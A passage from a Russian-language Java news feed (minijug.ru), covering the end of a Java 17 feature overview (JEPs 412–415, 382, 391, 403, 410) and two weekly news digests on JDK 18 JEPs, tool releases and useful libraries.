&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/412"&gt;Foreign Function &amp; Memory API (Incubator) (JEP 412)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Foreign Memory API, который побывал в Java &lt;a href="https://openjdk.java.net/jeps/370"&gt;14&lt;/a&gt;, &lt;a href="https://openjdk.java.net/jeps/383"&gt;15&lt;/a&gt;, &lt;a href="https://openjdk.java.net/jeps/393"&gt;16&lt;/a&gt; в инкубационном статусе, и Foreign Linker API, появившийся в &lt;a href="https://openjdk.java.net/jeps/389"&gt;Java 16&lt;/a&gt;, теперь объединены в один Foreign Function &amp; Memory API, и он всё ещё остаётся в инкубационном статусе в модуле &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/jdk.incubator.foreign/module-summary.html"&gt;&lt;code&gt;jdk.incubator.foreign&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/414"&gt;Vector API (Second Incubator) (JEP 414)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Векторное API, которое появилось в &lt;a href="https://openjdk.java.net/jeps/338"&gt;Java 16&lt;/a&gt; в инкубационном статусе, всё ещё остаётся в этом статусе в модуле &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/jdk.incubator.vector/module-summary.html"&gt;&lt;code&gt;jdk.incubator.vector&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/415"&gt;Context-Specific Deserialization Filters (JEP 415)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Фильтры десериализации, которые &lt;a href="https://openjdk.java.net/jeps/290"&gt;появились в Java 9&lt;/a&gt; для контроля десериализации из ненадёжных источников данных, стали более гибкими благодаря введению фабрики фильтров. Если раньше возможно было только указывать фильтр индивидуально для каждого объекта &lt;code&gt;ObjectInputStream&lt;/code&gt; или использовать один глобальный статический фильтр для всей виртуальной машины, то сейчас можно указать статическую фабрику фильтров, которая для каждой операции десериализации будет возвращать нужный фильтр, подходящий для данного контекста.&lt;/p&gt;
&lt;p&gt;Фабрику фильтров можно установить через метод &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.Config.html#setSerialFilterFactory(java.util.function.BinaryOperator)"&gt;&lt;code&gt;ObjectInputFilter.Config::setSerialFilterFactory&lt;/code&gt;&lt;/a&gt;, либо через аргументы командной строки, передав имя класса фабрики в свойство &lt;code&gt;jdk.serialFilterFactory&lt;/code&gt;.&lt;/p&gt;

&lt;h4&gt;JVM&lt;/h4&gt;
&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/382"&gt;New macOS Rendering Pipeline (JEP 382)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Реализован новый конвейер рендеринга на основе современного &lt;a href="https://developer.apple.com/metal/"&gt;Apple Metal API&lt;/a&gt;, который был создан с целью заменить устаревший Apple OpenGL API. Новый конвейер сосуществует со старым, который пока что остаётся включённым по умолчанию, но если OpenGL не работает, то запускается новый. Таким образом, Java 17 полностью готова к запуску на будущих версиях macOS, где OpenGL API будет окончательно удалён. Также новый конвейер можно включить явно, указав опцию &lt;code&gt;-Dsun.java2d.metal=true&lt;/code&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/391"&gt;Порт под macOS/AArch64 (JEP 391)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;OpenJDK портирован на архитектуру macOS/AArch64, и теперь список дистрибутивов OpenJDK и Oracle JDK пополнился сборками для Apple M1.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/403"&gt;Строгая инкапсуляция внутренностей JDK (JEP 403)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Инкапсуляция внутренних API, которая была &lt;a href="https://openjdk.java.net/jeps/260"&gt;введена в Java 9&lt;/a&gt; и была выключена по умолчанию &lt;a href="https://openjdk.java.net/jeps/396"&gt;в Java 16&lt;/a&gt;, но всё ещё могла быть включена одной опцией командной строки, теперь не может быть включена одной опцией:&lt;/p&gt;
&lt;pre&gt;&amp;gt; java --illegal-access=permit Main
&lt;span style="color: orange"&gt;OpenJDK 64-Bit Server VM warning: Ignoring option --illegal-access=permit;
  support was removed in 17.0&lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;Таким образом, доступиться до внутренностей JDK (&lt;code&gt;sun.*&lt;/code&gt;, &lt;code&gt;com.sun.*&lt;/code&gt;, &lt;code&gt;jdk.internal.*&lt;/code&gt; и т.д.) теперь можно только путём явного перечисления всех необходимых пакетов с помощью опций &lt;code&gt;--add-opens&lt;/code&gt; или &lt;code&gt;--add-exports&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Изменения не касаются критического API в модуле &lt;code&gt;jdk.unsupported&lt;/code&gt;: классы в пакетах &lt;code&gt;sun.misc&lt;/code&gt; и &lt;code&gt;sun.reflect&lt;/code&gt; остаются доступными без флагов.&lt;/p&gt;
&lt;p&gt;В будущем опция &lt;code&gt;--illegal-access&lt;/code&gt; будет удалена окончательно, и при её использовании будет ошибка старта.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/410"&gt;Удаление экспериментальных компиляторов AOT и JIT (JEP 410)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Удалены экспериментальные &lt;a href="https://openjdk.java.net/jeps/295"&gt;ahead-of-time&lt;/a&gt; и &lt;a href="https://openjdk.java.net/jeps/317"&gt;just-in-time&lt;/a&gt; Graal компиляторы. Такое решение было принято из-за сложности поддержки и их малой используемости (те, кому они нужны, используют &lt;a href="https://www.graalvm.org/"&gt;GraalVM&lt;/a&gt;). По факту этих компиляторов уже не было в сборках JDK 16 от Oracle.&lt;/p&gt;
&lt;p&gt;Удалению подлежали три модуля: &lt;code&gt;jdk.aot&lt;/code&gt;, &lt;code&gt;jdk.internal.vm.compiler&lt;/code&gt; и &lt;code&gt;jdk.internal.vm.compiler.management&lt;/code&gt;. Модуль &lt;a href="https://openjdk.java.net/jeps/243"&gt;JVMCI&lt;/a&gt; (&lt;code&gt;jdk.internal.vm.ci&lt;/code&gt;) остался, чтобы у разработчиков всё ещё оставалась возможность использовать внешний JIT-компилятор.&lt;/p&gt;

&lt;h4&gt;Заключение&lt;/h4&gt;
&lt;p&gt;Предыдущая версия OpenJDK с Long Term Support, &lt;a href="https://minijug.ru/java_11_is_out.html"&gt;Java 11&lt;/a&gt;, вышла ровно 3 года назад, хотя кажется, что она вышла совсем недавно, практически вчера. Но вот уже вышло 5 версий (12, 13, 14, 15, 16) и мы не успели опомниться, как подоспела следующая LTS-версия, Java 17.&lt;/p&gt;
&lt;p&gt;Для тех, кто будет переходить с 11, Java 17 будет достаточно &lt;a href="http://openjdk.java.net/projects/jdk/17/jeps-since-jdk-11"&gt;большим апгрейдом&lt;/a&gt;. Если сложить все релизы с 12 по 17, то в сумме появилось 5 больших языковых конструкций: выражения &lt;code&gt;switch&lt;/code&gt;, блоки текста, записи, паттерн-матчинг для &lt;code&gt;instanceof&lt;/code&gt; и &lt;code&gt;sealed&lt;/code&gt; классы. Появилось очень много интересного API, сделано много улучшений производительности, оптимизировано потребление памяти, уменьшено время старта JVM. Очень много чего было удалено, поэтому могут возникнуть некоторые трудности при миграции.&lt;/p&gt;
&lt;p&gt;Следующими большими шагами для Java будет завершение реализации проектов &lt;a href="http://openjdk.java.net/projects/valhalla/"&gt;Valhalla&lt;/a&gt;, &lt;a href="http://openjdk.java.net/projects/loom/"&gt;Loom&lt;/a&gt; и &lt;a href="http://openjdk.java.net/projects/panama/"&gt;Panama&lt;/a&gt;, а также дальнейшие языковые улучшения в проекте &lt;a href="http://openjdk.java.net/projects/amber/"&gt;Amber&lt;/a&gt;. Увидим ли мы всё это в следующей LTS-версии? Узнаем через &lt;a href="https://mreinhold.org/blog/forward-even-faster"&gt;2 года&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #27</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_27.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_27.html</id>
    <updated>2021-08-29T17:00:00Z</updated>
    <published>2021-08-29T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Стали известны первые два JEP'а, которые попадут в Java 18:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://openjdk.java.net/jeps/400"&gt;JEP 400: UTF-8 by Default&lt;/a&gt;. В нём предлагается сделать UTF-8 кодировкой по умолчанию на всех платформах. Про него мы писали в &lt;a href="java_news_10.html"&gt;выпуске #10&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://openjdk.java.net/jeps/413"&gt;JEP 413: Code Snippets in Java API Documentation&lt;/a&gt;. В этом JEP предлагается ввести новый тег &lt;code&gt;@snippet&lt;/code&gt;, помощью которого можно будет вставлять в javadoc примеры кода. Про него мы писали в &lt;a href="java_news_5.html"&gt;выпуске #5&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; В IntelliJ IDEA появилась базовая поддержка Java 17. В &lt;a href="https://blog.jetbrains.com/idea/2021/08/intellij-idea-2021-2-1/"&gt;новой версии 2021.2.1&lt;/a&gt; теперь есть новый уровень языка "17 - Sealed types, always-strict floating-point semantics", а также "17 (Preview) - Pattern matching for switch", включив который, можно попробовать &lt;a href="https://openjdk.java.net/jeps/406"&gt;новую preview конструкцию языка&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Завершились голосования за создание проектов &lt;a href="https://mail.openjdk.java.net/pipermail/announce/2021-August/000306.html"&gt;Wakefield&lt;/a&gt; и &lt;a href="https://mail.openjdk.java.net/pipermail/announce/2021-August/000307.html"&gt;CRaC&lt;/a&gt;. Теперь лидеры могут официально стартовать проекты.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; JUGNsk выложил &lt;a href="https://www.youtube.com/playlist?list=PLecWId-JT7S5cqUiY7ixWcZgjdRV4upnw"&gt;видеозаписи докладов&lt;/a&gt; с февральской конференции SnowOne 2021.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://micronaut.io/2021/08/18/micronaut-framework-3-released/"&gt;Micronaut 3&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://docs.gradle.org/7.2/release-notes.html"&gt;Gradle 7.2&lt;/a&gt;.&lt;/p&gt;

&lt;h4 class="pt-2"&gt;Полезняшки&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://github.com/TravaOpenJDK/trava-jdk-11-dcevm"&gt;TravaOpenJDK11&lt;/a&gt; &amp;ndash; модификация OpenJDK 11 с улучшенной возможностью переопределения загруженных классов во время выполнения. Является продолжением проекта &lt;a href="https://ssw.jku.at/dcevm/"&gt;DCEVM&lt;/a&gt;. Если в обычной версии HotSpot механизм hotswap позволяет изменять только тела методов, то в DCEVM можно добавлять и удалять поля и методы, не перезапуская JVM.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/gaul/modernizer-maven-plugin"&gt;Modernizer Maven Plugin&lt;/a&gt; &amp;ndash; плагин для Maven, который ищет в проекте использования legacy API. При нахождении таких API плагин предлагает современную альтернативу (например, &lt;code&gt;java.util.Objects.equal()&lt;/code&gt; вместо &lt;code&gt;com.google.common.base.Objects.equal()&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/atp-mipt/ljv"&gt;Lightweight Java Visualizer&lt;/a&gt; &amp;ndash; библиотека, которая парсит Java-объект с помощью рефлексии, строит граф и визуализирует его с помощью Graphviz. Очень удобно, когда нужно быстро понять, как устроена та или иная структура данных.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #26</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_26.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_26.html</id>
    <updated>2021-08-14T17:00:00Z</updated>
    <published>2021-08-14T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышел первый &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-August/005906.html"&gt;релиз-кандидат JDK 17&lt;/a&gt;. Им стала сборка JDK 17+35.&lt;/p&gt;
&lt;p&gt;Также вышла ранняя сборка &lt;a href="http://jdk.java.net/18/"&gt;JDK 18+10&lt;/a&gt;. Кроме того, появилось обновление Loom: &lt;a href="https://jdk.java.net/loom/"&gt;JDK 18-loom+2&lt;/a&gt;. Список архитектур, поддерживаемых Loom, пополнился AArch64.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышло два новых JEP:&lt;/p&gt;
&lt;p&gt;Первый &amp;ndash; &lt;a href="https://openjdk.java.net/jeps/416"&gt;JEP 416: Reimplement Core Reflection with Method Handles&lt;/a&gt;. Про него мы писали в &lt;a href="java_news_18.html"&gt;выпуске 18&lt;/a&gt;, когда был опубликован его черновик.&lt;/p&gt;
&lt;p&gt;Второй &amp;ndash; &lt;a href="https://openjdk.java.net/jeps/417"&gt;JEP 417: Vector API (Third Incubator)&lt;/a&gt;. Это уже третья итерация Vector API в Java. &lt;a href="https://openjdk.java.net/jeps/338"&gt;Первая&lt;/a&gt; попала в Java 16, &lt;a href="https://openjdk.java.net/jeps/414"&gt;вторая&lt;/a&gt; &amp;ndash; в Java 17. Таким образом, третья должна попасть в &lt;a href="http://openjdk.java.net/projects/jdk/18/"&gt;Java 18&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В рассылке OpenJDK &lt;a href="https://mail.openjdk.java.net/pipermail/announce/2021-August/000305.html"&gt;объявлено голосование&lt;/a&gt; по созданию нового проекта JDK под именем Wakefield. Целью этого проекта будет поддержка в Java сервера дисплея &lt;a href="https://ru.wikipedia.org/wiki/Wayland"&gt;Wayland&lt;/a&gt; в Linux, который создан для полной замены устаревшего X11. Лидером проекта предложил себя Фил Рэйс из Oracle.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Переход AdoptOpenJDK в проект Eclipse Adoptium &lt;a href="https://blog.adoptopenjdk.net/2021/08/goodbye-adoptopenjdk-hello-adoptium/"&gt;полностью завершён&lt;/a&gt;. Теперь скачивать сборки OpenJDK (которые теперь называются Eclipse Temurin) рекомендуется с сайта &lt;a href="https://adoptium.net/"&gt;adoptium.net&lt;/a&gt;. При этом сайт &lt;a href="https://adoptopenjdk.net/"&gt;AdoptOpenJDK&lt;/a&gt; и его API будут ещё какое-то время функционировать.&lt;/p&gt;
&lt;p&gt;Сборки OpenJ9 не будут предоставляться Adoptium, поэтому их нужно скачивать с &lt;a href="https://developer.ibm.com/languages/java/semeru-runtimes/"&gt;сайта IBM&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Опубликован &lt;a href="https://redmonk.com/sogrady/2021/08/05/language-rankings-6-21/"&gt;RedMonk Programming Languages Rankings&lt;/a&gt; за 2021 год. В этом рейтинге популярность языков программирования вычисляется на основе метрик, собранных с GitHub и StackOverflow. В этом году ничего кардинального для Java и других JVM-языков не произошло: популярность Java немного возросла, и она стала делить второе место с Python (в прошлом году Python и Java занимали второе и третье место соответственно), а Scala, Kotlin и Groovy остались приблизительно на своих местах.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://maven.apache.org/download.cgi"&gt;Apache Maven 3.8.2&lt;/a&gt;. Список изменений можно посмотреть &lt;a href="https://issues.apache.org/jira/secure/ReleaseNote.jspa?projectId=12316922&amp;version=12349965"&gt;здесь&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://mail.openjdk.java.net/pipermail/jmh-dev/2021-August/003355.html"&gt;JMH 1.33&lt;/a&gt;.&lt;/p&gt;

&lt;h4 class="pt-2"&gt;Полезняшки&lt;/h4&gt;
&lt;p&gt;Чтобы выпуски новостей сделать более занимательными, я решил открыть новую рубрику &amp;laquo;Полезняшки&amp;raquo;, где я буду выкладывать по несколько ссылок на интересные инструменты, библиотеки, фреймворки, которые могут оказаться полезными для разработчиков на Java или других JVM-языках.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href="https://github.com/Col-E/Recaf"&gt;Recaf&lt;/a&gt; &amp;ndash; программа просмотра class-/jar-файлов с возможностью редактирования байткода и его сохранения.&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://jqwik.net/"&gt;jqwik&lt;/a&gt; &amp;ndash; библиотека для тестирования на основе свойств (property-based testing). Название намекает на отсылку к &lt;a href="https://en.wikipedia.org/wiki/QuickCheck"&gt;QuickCheck&lt;/a&gt;, оригинальной библиотеке на Haskell для написания тестов на основе свойств.&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://github.com/linkedin/URL-Detector"&gt;URL-Detector&lt;/a&gt; &amp;ndash; библиотека для поиска URL в строках. Написана командой безопасности LinkedIn.&lt;/li&gt;
&lt;/ol&gt;</content>
  </entry>
</feed>
